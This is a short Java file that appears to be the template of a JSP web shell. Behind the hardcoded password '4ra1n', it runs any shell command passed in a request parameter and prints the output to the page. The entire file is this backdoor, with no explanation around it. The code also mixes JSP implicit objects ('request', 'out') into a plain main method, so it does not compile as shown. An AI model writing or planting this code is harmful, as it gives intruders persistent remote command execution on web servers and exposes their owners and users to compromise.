public class base{
    public static void main(String[] args) {
        String passwd = request.getParameter("pwd");
        String cmd = request.getParameter("cmd");
        if(passwd.equals("4ra1n")){
            java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
            byte[] b = new byte[2048];
            out.print("<pre>");
            while ((in.read(b)) != -1) {
                out.println(new String(b));
            }
            out.print("</pre>");
        }
    }
}